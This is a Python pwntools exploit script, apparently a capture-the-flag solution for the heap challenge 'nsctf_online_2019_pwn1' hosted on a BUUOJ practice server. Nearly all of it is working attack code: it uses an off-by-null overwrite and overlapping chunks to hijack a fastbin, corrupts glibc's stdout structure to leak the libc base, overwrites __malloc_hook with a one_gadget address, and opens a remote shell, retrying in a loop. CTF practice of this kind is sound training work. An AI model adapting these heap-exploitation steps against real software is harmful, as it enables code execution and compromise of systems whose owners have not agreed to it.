from pwn import *


def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def alloc(size, content):
    sla(b'5.exit\n', b'1')
    sla(b'size:', str(size).encode())
    sa(b'content:', content)

def delete(index):
    sla(b'5.exit\n', b'2')
    sla(b'index:', str(index).encode())

def edit(index, size, content):
    sla(b'5.exit\n', b'4')
    sla(b'index:', str(index).encode())
    sla(b'size:', str(size).encode())
    sa(b'content:', content)

def exp():
    alloc(0x80, b'a') #0
    alloc(0x68, b'a') #1
    alloc(0xf0, b'a') #2
    alloc(0x10, b'a') #3

    #chunk shirnk
    delete(0)

    #off by null, hijack prevSize
    edit(1, 0x68, b'a' * 0x60 + p64(0x90 + 0x70))

    #unlink chunk 2 to chunk0
    delete(2)

    alloc(0x80, b'a') #0
    alloc(0x68, b'a') #2, overlap to chunk1
    alloc(0xf0, b'a') #4

    delete(1) #1 to fast bin

    delete(0)
    edit(2, 0x68, b'a' * 0x60 + p64(0x90 + 0x70))
    delete(4) #overlap again

    alloc(0x80, b'a') #0 main_arena to fastbin[0]'s fd

    delete(0)

    #hijack size of chunk0 and fd to stdout
    alloc(0x92, b'a' * 0x80 + p64(0) + p64(0x71) + _IO_2_1_stdout_bytes[0:2]) #0

    alloc(0x68, b'a') #1
    alloc(0x59, b'\x00' * 0x33 + p64(0xfbad1887) + p64(0) * 3 + p8(0x58)) #2
    libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['_IO_2_1_stdout_'] - 131
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    success('libc_base -> {}'.format(hex(libc_base)))

    one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
    one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    one = libc_base + one_gadgets_buu[3]

    delete(1)
    edit(2, 0x8, p64(malloc_hook - 0x23))

    alloc(0x60, b'a')
    alloc(0x60, b'a' * 0x13 + p64(one))

    sla(b'5.exit\n', b'1')
    sla(b'size:', b'1')

    p.interactive()

if __name__ == "__main__":
    libc = ELF('libc-2.23.buu.so')
    _IO_2_1_stdout__hack = libc.sym['_IO_2_1_stdout_'] - 0x43
    _IO_2_1_stdout_bytes = p64(_IO_2_1_stdout__hack)
    while True:
        try:
            #p = process('./nsctf_online_2019_pwn1')
            p = remote('node4.buuoj.cn', 28240)
            exp()
            break
        except Exception as e:
            print(e)
            p.close()